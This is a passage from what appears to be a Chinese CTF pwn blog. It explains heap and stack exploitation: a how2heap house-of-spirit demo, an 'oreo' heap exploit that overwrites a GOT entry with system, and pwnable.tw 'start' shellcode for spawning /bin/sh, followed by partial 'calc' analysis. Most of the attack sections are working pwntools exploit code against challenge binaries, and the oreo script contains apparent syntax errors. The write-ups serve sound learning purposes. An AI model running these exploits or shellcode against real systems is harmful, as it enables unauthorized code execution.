class="line">p.sendlineafter(<span class="string">&quot;Please type your guessing flag&quot;</span>,payload)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;*** stack smashing detected ***: &quot;</span>)</span><br><span class="line">puts_gots = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\0&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;puts_gots : &quot;</span> + <span class="built_in">hex</span>(puts_gots)</span><br><span class="line"></span><br><span class="line">libc_addr = puts_gots - libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;libc_addr : &quot;</span> + <span class="built_in">hex</span>(libc_addr)</span><br><span class="line">stack_addr = libc_addr + libc.symbols[<span class="string">&#x27;environ&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload = <span class="number">0x128</span> * <span class="string">&#x27;B&#x27;</span> + p64(stack_addr)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Please type your guessing flag&quot;</span>,payload)</span><br><span class="line">p.recvuntil(<span class="string">&quot;*** stack smashing detected ***: &quot;</span>)</span><br><span class="line">stack_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\0&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;stack_addr : &quot;</span> + <span class="built_in">hex</span>(stack_addr)</span><br><span class="line"></span><br><span class="line">payload = <span class="number">0x128</span> * <span class="string">&#x27;C&#x27;</span> + p64(stack_addr - <span class="number">0x168</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Please type your guessing flag&quot;</span>,payload)</span><br><span class="line">p.recvuntil(<span class="string">&quot;*** stack smashing detected ***: &quot;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>WriteUp</tag>
      </tags>
  </entry>
  <entry>
    <title>House_of_spirit</title>
    <url>/2020/03/06/house-of-spirit/</url>
    <content><![CDATA[<p>​        Fastbin Attack 中的 house_of_spirit。 (精神家园？？)<span id="more"></span></p>
<h2 id="0x00-house-of-spirit"><a href="#0x00-house-of-spirit" class="headerlink" title="0x00 . house_of_spirit"></a>0x00 . house_of_spirit</h2><p>​        按照惯例。。。看看how2heap的代码：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;This file demonstrates the house of spirit attack.\n&quot;</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Calling malloc() once so that it sets up its memory.\n&quot;</span>);</span><br><span class="line">	<span class="built_in">malloc</span>(<span class="number">1</span>);</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;We will now overwrite a pointer to point to a fake &#x27;fastbin&#x27; region.\n&quot;</span>);</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *a;</span><br><span class="line">	<span class="comment">// This has nothing to do with fastbinsY (do not be fooled by the 10) - fake_chunks is just a piece of memory to fulfil allocations (pointed to from fastbinsY)</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> fake_chunks[<span class="number">10</span>] __attribute__ ((<span class="built_in">aligned</span> (<span class="number">16</span>)));</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;This region (memory of length: %lu) contains two chunks. The first starts at %p and the second at %p.\n&quot;</span>, <span class="built_in"><span class="keyword">sizeof</span></span>(fake_chunks), &amp;fake_chunks[<span class="number">1</span>], &amp;fake_chunks[<span class="number">9</span>]);</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;This chunk.size of this region has to be 16 more than the region (to accommodate the chunk data) while still falling into the fastbin category (&lt;= 128 on x64). The PREV_INUSE (lsb) bit is ignored by free for fastbin-sized chunks, however the IS_MMAPPED (second lsb) and NON_MAIN_ARENA (third lsb) bits cause problems.\n&quot;</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end. \n&quot;</span>);</span><br><span class="line">	fake_chunks[<span class="number">1</span>] = <span class="number">0x40</span>; <span class="comment">// this is the size</span></span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;The chunk.size of the *next* fake region has to be sane. That is &gt; 2*SIZE_SZ (&gt; 16 on x64) &amp;&amp; &lt; av-&gt;system_mem (&lt; 128kb by default for the main arena) to pass the nextsize integrity checks. No need for fastbin size.\n&quot;</span>);</span><br><span class="line">        <span class="comment">// fake_chunks[9] because 0x40 / sizeof(unsigned long long) = 8</span></span><br><span class="line">	fake_chunks[<span class="number">9</span>] = <span class="number">0x1234</span>; <span class="comment">// nextsize</span></span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, %p.\n&quot;</span>, &amp;fake_chunks[<span class="number">1</span>]);</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.\n&quot;</span>);</span><br><span class="line">	a = &amp;fake_chunks[<span class="number">2</span>];</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Freeing the overwritten pointer.\n&quot;</span>);</span><br><span class="line">	<span class="built_in">free</span>(a);</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Now the next malloc will return the region of our fake chunk at %p, which will be %p!\n&quot;</span>, &amp;fake_chunks[<span class="number">1</span>], &amp;fake_chunks[<span class="number">2</span>]);</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;malloc(0x30): %p\n&quot;</span>, <span class="built_in">malloc</span>(<span class="number">0x30</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​        说实话，这个代码看得脑壳疼，没完全看懂。</p>
<p>​        大概的攻击思路就是，找一个可控的区域，比如栈，bss段，可读可写的，在此区域写一个fake fast chunk，然后想办法free掉，这么一来就掉进了fastbin里面。因为fake fast chunk在链表头(main_arena指向)，所以malloc后fake chunk会直接分配出来，然后就可以任意读写随意浪了。</p>
<h2 id="0x01-oreo-🍪"><a href="#0x01-oreo-🍪" class="headerlink" title="0x01 . oreo  🍪"></a>0x01 . oreo  🍪</h2><h3 id="A-ELF-Analysis"><a href="#A-ELF-Analysis" class="headerlink" title="A . ELF Analysis"></a>A . ELF Analysis</h3><p>​        明明是个买枪的程序。。。为啥叫奥利奥</p>
<img src="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/house_of_spirit/1.png" class="lazyload" data-srcset="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/house_of_spirit/1.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" style="zoom:80%;" />

<p>​        花里胡哨的最喜欢了😬😬😬</p>
<img src="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/house_of_spirit/2.png" class="lazyload" data-srcset="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/house_of_spirit/2.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" style="zoom:67%;" />

<p>​        主要函数如下</p>
<img src="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/house_of_spirit/3.png" class="lazyload" data-srcset="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/house_of_spirit/3.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" style="zoom:80%;" />

<p>​        add函数里可以发现，程序添加chunk时，会形成这样的一种链表结构：</p>
<img src="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/house_of_spirit/4.jpg" class="lazyload" data-srcset="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/house_of_spirit/4.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" style="zoom:20%;" />

<p>​        并且存在明显的溢出，所以可以估摸着覆盖掉next指针。</p>
<img src="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/house_of_spirit/5.png" class="lazyload" data-srcset="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/house_of_spirit/5.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" style="zoom:80%;" />

<p>​        show()：展示所有订单的description和name。</p>
<p>​        order()：下单，并删除前面所有chunk。</p>
<p>​        leave()：在订单中备注，用到了message指针(bss段)，而message指针在程序开头就指向了message_ptr。</p>
<p>​        stats()：输出订单数和备注数以及最近一次备注内容，可以用作输出。</p>
<p>​        程序中用到的许多重要指针都能在bss段找到：</p>
<img src="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/house_of_spirit/6.png" class="lazyload" data-srcset="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/house_of_spirit/6.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" style="zoom: 80%;" />

<h3 id="B-Main-ideas-💡"><a href="#B-Main-ideas-💡" class="headerlink" title="B . Main ideas  💡"></a>B . Main ideas  💡</h3><ul>
<li><p>堆溢出构造链表，Leak libc_base。</p>
</li>
<li><p>伪造fake chunk，并且绕过检测</p>
</li>
<li><p>Getshell</p>
</li>
</ul>
<h3 id="C-Step-by-Step"><a href="#C-Step-by-Step" class="headerlink" title="C . Step by Step"></a>C . Step by Step</h3><h4 id="1-Leak-libc-base"><a href="#1-Leak-libc-base" class="headerlink" title="1.Leak libc_base"></a>1.Leak libc_base</h4><ul>
<li>新建一个chunk，通过溢出使得其next指针指向puts@got</li>
<li>show()查看所有chunk的内容，得到puts_addr</li>
<li>通过计算得到libc_base，system@got。</li>
</ul>
<h4 id="2-Arrange-fake-chunk"><a href="#2-Arrange-fake-chunk" class="headerlink" title="2.Arrange fake chunk"></a>2.Arrange fake chunk</h4><ul>
<li><p>循环新建chunk，当count_in_add == 0x3f，退出循环。</p>
</li>
<li><p>此时再新建一个chunk构造fake chunk。此时count_in_add == 0x40，我们可以将其用作fake chunk size</p>
</li>
<li><p>fake chunk结构如下：</p>
<img src="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/house_of_spirit/7.jpg" class="lazyload" data-srcset="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/house_of_spirit/7.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" style="zoom: 25%;" /></li>
<li><p>把fake chunk的next chunk的pre_size也给改了，就能绕过测试了。</p>
</li>
<li><p>万事俱备，用order()来free掉整个链表，然后main_arena就指向了最后的fake chunk。</p>
<h4 id="3-Getshell"><a href="#3-Getshell" class="headerlink" title="3.Getshell"></a>3.Getshell</h4></li>
<li><p>现在我们add()就能得到fake chunk，再在里面写入fgets@got，也就是写入到了fake chunk的fd位置。fgets@got在菜单循环的switch的参数函数中会用到。而红色箭头位置就是我们要写入“/bin/sh”的地儿。</p>
</li>
</ul>
<img src="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/house_of_spirit/8.png" class="lazyload" data-srcset="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/house_of_spirit/8.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" style="zoom: 80%;" />

<ul>
<li>这时再用leave()函数，修改message。注意此时message与fake chunk的fd是同一地址，上面的fake chunk结构图比较清楚。将message中内容(fgets@got)改成system@got。</li>
<li>现在直接送入”/bin/sh\x00”就行啦。</li>
</ul>
<h3 id="D-Exploit"><a href="#D-Exploit" class="headerlink" title="D . Exploit"></a>D . Exploit</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&#x27;./oreo&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./oreo&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">des,name</span>):</span></span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Action: &quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Rifle name: &quot;</span>,name)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Rifle description: &quot;</span>,des)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>():</span></span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Action: &quot;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">	p.recvuntil(<span class="string">&quot;===================================&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">order</span>():</span></span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Action: &quot;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">	p.recvuntill(<span class="string">&quot;Okay order submitted!&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leave</span>(<span class="params">message</span>):</span></span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Action: &quot;</span>,<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;your order:&quot;</span>,message)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">stats</span>():</span></span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Action: &quot;</span>,<span class="built_in">str</span>(<span class="number">5</span>))</span><br><span class="line"></span><br><span class="line">puts_got = elf.gots[puts]</span><br><span class="line">free_got = elf.gots[free]</span><br><span class="line">puts_offset = libc.symbols[puts]</span><br><span class="line">system_offset = libc.symbols[system]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#========================Leak libc base============================</span></span><br><span class="line">payload = <span class="number">27</span> * <span class="string">&#x27;X&#x27;</span> + p32(puts_got)		<span class="comment">#so the next chunk we could recv puts_got</span></span><br><span class="line">add(<span class="string">&quot;Nothing&quot;</span>,payload)</span><br><span class="line">show()</span><br><span class="line">p.recvuntil(<span class="string">&quot;===================================&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Description: &quot;</span>)</span><br><span class="line">puts_plt = u32(p.recvuntil(<span class="string">&#x27;\n&#x27;</span>, drop=<span class="literal">True</span>)[:<span class="number">4</span>])		<span class="comment">#got the ture addr of puts</span></span><br><span class="line">libc_base = puts_plt - puts_offset</span><br><span class="line">system_addr = libc_base + system_offset</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#========================Arrange fake chunk==========================</span></span><br><span class="line">num = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> num&lt;3f :		<span class="comment">#System will break the circle while num (count_in_add) == 3f</span></span><br><span class="line">	add(<span class="built_in">str</span>(num),<span class="string">&quot;gun&quot;</span>+<span class="built_in">str</span>(num))</span><br><span class="line">	num++</span><br><span class="line">payload = <span class="number">27</span> * <span class="string">&#x27;X&#x27;</span> + p32(<span class="number">0x0804A2A8</span>)		<span class="comment">#But 0x0804A2A8(massage) is now saving the message_ptr</span></span><br><span class="line">add(<span class="string">&quot;Nothing&quot;</span>,payload)		<span class="comment">#count_in_add == 0x40,so it can be used as the size of fake_chunk</span></span><br><span class="line"></span><br><span class="line">payload = <span class="number">0x20</span> * <span class="string">&#x27;X&#x27;</span> + p32(<span class="number">0x40</span>)</span><br><span class="line">leave(payload)		<span class="comment">#now the fake_chunk is in the link_list and able to bypass the test</span></span><br><span class="line">order()		<span class="comment">#delete the linklist,so the fake_chunk is in the fastbin now</span></span><br><span class="line"><span class="comment">#============================Getshell=============================</span></span><br><span class="line">fgets_got = elf.got[fgets]</span><br><span class="line">add(fgets_got,<span class="string">&quot;Nothing&quot;</span>)		<span class="comment">#the fake_chunk was malloced since it is in the bin_top</span></span><br><span class="line">leave(system_addr)		<span class="comment">#fgets_got was changed to system_addr</span></span><br><span class="line">p.sendline(<span class="string">&quot;/bin/sh\x00&quot;</span>)		<span class="comment">#fgets(&quot;/bin/sh&quot;) &lt;====&gt; system(&quot;/bin/sh&quot;)</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>heap</tag>
      </tags>
  </entry>
  <entry>
    <title>Pwnable.tw (start &amp; calc)</title>
    <url>/2020/07/25/pwnable/</url>
    <content><![CDATA[<p>​        最近边看书边刷pwnable.tw，记录一下write up。<span id="more"></span></p>
<h2 id="0x00-start"><a href="#0x00-start" class="headerlink" title="0x00 . start"></a>0x00 . start</h2><h3 id="A-Analysis"><a href="#A-Analysis" class="headerlink" title="A . Analysis"></a>A . Analysis</h3><p>​        之前看这个题的时候一脸懵逼，事隔经年感觉貌似能做。。。</p>
<p>​        程序里只有一个浓眉大眼的start函数：</p>
<p><img src="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/img/20200724212908.png" class="lazyload" data-srcset="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/img/20200724212908.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII="></p>
<p>​        其实差不多是这两行代码，一个输出一个输入。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">esp = <span class="string">&quot;Let&#x27;s start the CTF:&quot;</span>;</span><br><span class="line">write(<span class="number">1</span>,esp,<span class="number">0x14</span>);</span><br><span class="line">read(<span class="number">0</span>,esp,<span class="number">0x3C</span>);</span><br></pre></td></tr></table></figure>

<p>​        而且没NX保护：</p>
<p><img src="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/img/20200724213537.png" class="lazyload" data-srcset="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/img/20200724213537.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII="></p>
<p>​        那果断shellcode呗。虽然不知道栈底的位置，但可以找到start函数结束时执行了”add esp,14h”的汇编语句，可以猜测栈的大小为0x14，因为栈顶就是我们输入字符串的地方，所以padding的大小也是这么多。</p>
<p>​        不过第一次输入时，要先返回到0x08048087这个地址，此时栈帧已经收回，再一次执行write(1,esp,0x14)，就能leak出栈底地址了。</p>
<p>​        第二次输入，再将返回地址改成栈底+0x14，也就是shellcode的开头地址，即可执行shellcode。</p>
<p>​        然后开始写shellcode：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">xor ecx,ecx;</span><br><span class="line">xor edx,edx;</span><br><span class="line">push ecx;		 <span class="comment">#字符串结尾	</span></span><br><span class="line">push 0x68732f6e; <span class="comment">#&#x27;n/sh&#x27;</span></span><br><span class="line">push 0x69622f2f; <span class="comment">#&#x27;//bi&#x27;</span></span><br><span class="line">mov ebx,esp;</span><br><span class="line">mov eax,0xb;</span><br><span class="line">int 0x80;</span><br></pre></td></tr></table></figure>

<p>​        然后python转机器数：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">shellcode = <span class="string">&quot;xor ecx,ecx;xor edx,edx;push ecx;push 0x68732f6e;push 0x69622f2f;mov ebx,esp;mov eax,0xb;int 0x80;&quot;</span></span><br><span class="line">shellcode = asm(shellcode)</span><br></pre></td></tr></table></figure>

<p>​        然后跑payload：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p = process(&quot;./start&quot;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;chall.pwnable.tw&#x27;</span>,<span class="number">10000</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">payload = <span class="string">&#x27;A&#x27;</span>*<span class="number">20</span> + p32(<span class="number">0x08048087</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line">stack_addr = u32(p.recv(<span class="number">4</span>)) </span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;Here is addr:&quot;</span>+<span class="built_in">hex</span>(stack_addr)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">asm:</span></span><br><span class="line"><span class="string">xor ecx,ecx;</span></span><br><span class="line"><span class="string">xor edx,edx;</span></span><br><span class="line"><span class="string">push edx;</span></span><br><span class="line"><span class="string">push 0x68732f6e;</span></span><br><span class="line"><span class="string">push 0x69622f2f;</span></span><br><span class="line"><span class="string">mov ebx,esp;</span></span><br><span class="line"><span class="string">mov eax,0xb;</span></span><br><span class="line"><span class="string">int 0x80;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#shellcode=&#x27;\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80&#x27;</span></span><br><span class="line">shellcode = asm(<span class="string">&#x27;xor ecx,ecx;xor edx,edx;push edx;push 0x68732f6e;push 0x69622f2f ;mov ebx,esp;mov eax,0xb;int 0x80&#x27;</span>)</span><br><span class="line">payload = <span class="string">&#x27;A&#x27;</span>*<span class="number">0x14</span> + p32(stack_addr+<span class="number">0x14</span>)+shellcode</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>



<h2 id="0x01-calc"><a href="#0x01-calc" class="headerlink" title="0x01 . calc"></a>0x01 . calc</h2><h3 id="A-Analysis-1"><a href="#A-Analysis-1" class="headerlink" title="A . Analysis"></a>A . Analysis</h3><p>​        例行公事如下：</p>
<p><img src="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/img/20200724195515.png" class="lazyload" data-srcset="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/img/20200724195515.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII="></p>
<p>​        主要的函数是calc()，分别又实现了get_expr(),init_pool(),parse()三个函数。</p>
<p><img src="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/img/20200724202614.png" class="lazyload" data-srcset="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/img/20200724202614.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII="></p>
<p>​        get_expr()接受用户输入计算表达式，并过滤掉除了“+-*、%0123456789”之外的字符，init_pool()申请堆块来存放数组并且初始化，程序中的若干个运算数就被存放在这个数组中，parse()进行表达式的解析并且运算。</p>
<p>​        主要来看看parse函数的执行机制：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">signed</span> <span class="keyword">int</span> __cdecl <span class="title">parse_expr</span><span class="params">(<span class="keyword">int</span> str, _DWORD *num)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// ST2C_4</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// [esp+20h] [ebp-88h]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [esp+24h] [ebp-84h]</span></span><br><span class="line">  <span class="keyword">int</span> j; <span class="comment">// [esp+28h] [ebp-80h]</span></span><br><span class="line">  <span class="keyword">char</span> *s1; <span class="comment">// [esp+30h] [ebp-78h]</span></span><br><span class="line">  <span class="keyword">int</span> v9; <span class="comment">// [esp+34h] [ebp-74h]</span></span><br><span class="line">  <span class="keyword">char</span> <span class="keyword">operator</span>[<span class="number">100</span>]; <span class="comment">// [esp+38h] [ebp-70h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v11; <span class="comment">// [esp+9Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v11 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  v5 = str;</span><br><span class="line">  j = <span class="number">0</span>;</span><br><span class="line">  bzero(<span class="keyword">operator</span>, <span class="number">0x64</span>u);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( (*(i + str) - <span class="string">&#x27;0&#x27;</span>) &gt; <span class="number">9</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v2 = i + str - v5;</span><br><span class="line">      s1 = <span class="built_in">malloc</span>(v2 + <span class="number">1</span>);</span><br><span class="line">      <span class="built_in">memcpy</span>(s1, v5, v2);</span><br><span class="line">      s1[v2] = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(s1, <span class="string">&quot;0&quot;</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;prevent division by zero&quot;</span>);</span><br><span class="line">        fflush(<span class="built_in">stdout</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      v9 = atoi(s1);</span><br><span class="line">      <span class="keyword">if</span> ( v9 &gt; <span class="number">0</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v4 = (*num)++;</span><br><span class="line">        num[v4 + <span 